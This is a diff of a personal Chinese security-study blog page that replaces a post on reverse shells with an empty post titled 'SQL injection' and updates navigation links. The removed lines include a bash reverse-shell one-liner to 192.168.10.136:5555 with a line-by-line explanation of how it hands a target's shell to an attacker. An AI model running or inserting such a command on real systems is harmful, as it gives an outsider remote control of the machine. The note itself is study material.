@@ -4,9 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="反弹shell, 日拱一卒">
-    <meta name="description" content="cmd&amp;amp; 和||前后的命令无论真假都全部执行&amp;amp;&amp;amp;和|前命令为真，后命令才执行
-反弹shellbash -i &gt;&amp;amp; /dev/tcp/192.168.10.136/5555 0&gt;&amp;amp;1   这段代码是一个">
+    <meta name="keywords" content="sql注入, 日拱一卒">
+    <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>反弹shell | 日拱一卒</title>
+    <title>sql注入 | 日拱一卒</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
     <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
@@ -222,12 +221,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">反弹shell</h1>
+                    <h1 class="description center-align post-title">sql注入</h1>
                 </div>
             </div>
         </div>
@@ -355,7 +354,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-24
+                    2023-06-07
                 </div>
                 
 
@@ -379,24 +378,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h1><p>&amp; 和||前后的命令无论真假都全部执行<br>&amp;&amp;和|前命令为真，后命令才执行</p>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/192.168.10.136/5555 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>   这段代码是一个bash命令，用于在一个交互式的shell中执行命令。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ol>
-<li><p>bash -i 启动一个交互式的shell，即可以接受用户输入的shell</p>
-</li>
-<li><p>&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.10.136&#x2F;5555：将标准输出和标准错误重定向到一个TCP连接，连接的目标地址是192.168.10.136，端口号是5555。这意味着shell中执行的任何命令的输出都会发送到这个地址。</p>
-</li>
-<li><p>0&gt;&amp;1 将标准输入重定向到标准输出，即从TCP连接中读取输入。这意味着shell可以接受从这个地址发送过来的命令。</p>
-</li>
-</ol>
-<p>综上，这段代码的作用是创建一个反向shell，即在目标机器上运行一个shell，然后通过网络连接将其控制权交给攻击者。这是一种常见的渗透测试和黑客攻击的技术，可以让攻击者在目标机器上执行任意命令。</p>
-<p>&amp;&gt;和&gt;&amp;含义相同都是：都是将标准错误输出和标准输出重定向</p>
-<h1 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h1><p>格式： [n]&lt;&amp;[m] &#x2F; [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p>
-<p>说明：</p>
-<p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
-<p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读&#x2F;写方式打开对其没有任何影响）</strong></p>
-<p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>
-
+                
                 
             </div>
             <hr/>
@@ -422,7 +404,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://cshx.fun/2023/04/24/fan-dan-shell/">http://cshx.fun/2023/04/24/fan-dan-shell/</a>
+                    <a href="http://cshx.fun/2023/06/07/sql-zhu-ru/">http://cshx.fun/2023/06/07/sql-zhu-ru/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -503,9 +485,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/06/07/sql-zhu-ru/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="sql注入">
+                        
+                        <span class="card-title">sql注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            chens
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2023/05/17/shu-ru-shu-chu-chong-ding-xiang/">
                     <div class="card-image">
@@ -523,45 +544,8 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-05-17
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            chens
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/03/29/nei-wang-fang-wen-wai-wang/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="内网借助外网机器访问外网">
-                        
-                        <span class="card-title">内网借助外网机器访问外网</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-17
                             </span>
                         <span class="publish-author">
                             
